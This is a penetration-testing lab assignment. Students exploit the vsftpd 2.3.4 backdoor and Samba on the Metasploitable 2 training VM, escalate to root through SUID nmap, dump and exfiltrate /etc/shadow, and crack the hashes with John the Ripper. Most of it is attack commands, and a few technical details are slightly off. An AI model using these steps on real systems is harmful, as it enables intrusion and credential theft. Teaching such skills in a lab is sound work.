title: Metasploit Exploitation & Privilege Escalation on Metasploitable 2
description: Students exploit the vsftpd 2.3.4 backdoor to gain initial access, then escalate privileges to root using Metasploit post-exploitation modules and manual techniques, documenting each step for a professional penetration test report.
objective: Students will gain an initial foothold using a known backdoor vulnerability, transition to a Meterpreter session, perform post-exploitation reconnaissance, escalate privileges to root, and extract credential hashes — culminating in a professional findings writeup with evidence.

steps.title: Initial Exploitation via vsftpd 2.3.4 Backdoor
steps.instructions:
The vsftpd 2.3.4 package (CVE-2011-2523) contains a backdoor that opens a command shell on port 6200 when a username containing a smiley face `:)` is sent. Use Metasploit to exploit this.

```bash
# Start Metasploit
msfconsole -q

# Search for the exploit
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > run
```

You should receive a command shell. Verify access:

```bash
id
whoami
hostname
uname -a
```

Document: CVE number, exploit module path, exact output of `id` command.

steps.title: Upgrade to Meterpreter Session
steps.instructions:
The vsftpd exploit gives a basic shell. Upgrade to a full Meterpreter session for richer post-exploitation capabilities.

```bash
# In msfconsole, background the current session
^Z   # or type: background

# Use the shell-to-meterpreter upgrade module
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(...) > set SESSION 1
msf6 post(...) > run

# Interact with the new Meterpreter session
msf6 > sessions -l
msf6 > sessions -i 2
```

Alternatively, exploit Metasploitable's Samba (port 445) directly to get Meterpreter:

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit(...) > run
```

In your Meterpreter session, run: `sysinfo`, `getuid`, `ps`.

steps.title: Post-Exploitation Reconnaissance
steps.instructions:
With Meterpreter access established, enumerate the target system thoroughly.

```bash
# System information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps

# Network reconnaissance
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.56.0/24
meterpreter > run post/linux/gather/enum_network

# Find sensitive files
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/enum_users_history

# Check for local exploit opportunities
meterpreter > run post/multi/recon/local_exploit_suggester
```

Document: list of running processes, network interfaces, any other hosts discovered, and local exploits suggested.

steps.title: Privilege Escalation to Root
steps.instructions:
Escalate from the current user to root using discovered vulnerabilities.

**Method A — getsystem (if applicable):**
```bash
meterpreter > getsystem
```

**Method B — Local Kernel Exploit:**
```bash
# Drop to shell
meterpreter > shell

# Check kernel version
uname -a
# Result: Linux metasploitable 2.6.24-16-server ...

# Search for kernel exploits
msf6 > use post/multi/recon/local_exploit_suggester
# Then use recommended exploit
```

**Method C — SUID Abuse:**
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# nmap has SUID on Metasploitable!
nmap --interactive
nmap> !sh
id  # Should show root
```

Verify root access with `id` and `cat /etc/shadow`.

steps.title: Credential Harvesting & Report Compilation
steps.instructions:
Extract credentials and compile all evidence into a penetration test report section.

```bash
# Dump password hashes (from Meterpreter with root)
meterpreter > run post/linux/gather/hashdump

# Or from shell:
cat /etc/shadow

# Download the shadow file for offline cracking
meterpreter > download /etc/shadow /root/lab07/shadow.txt

# Attempt offline hash cracking with John the Ripper
john /root/lab07/shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /root/lab07/shadow.txt --show
```

**Report Section to Write (include in submission):**

| Finding | Severity | CVE | Evidence |
|---------|----------|-----|----------|
| vsftpd Backdoor | Critical | CVE-2011-2523 | Screenshot of id=root |
| Root via SUID nmap | High | N/A | Screenshot of nmap --interactive |
| Plaintext hashes in /etc/shadow | High | N/A | Redacted shadow file extract |

Write a remediation recommendation for each finding (minimum 2 sentences each).

expected_output: A penetration test report section (PDF) covering: exploit used with CVE reference, screenshot chain from initial shell to root, password hashes obtained (redacted), credential cracking results, and remediation recommendations table.
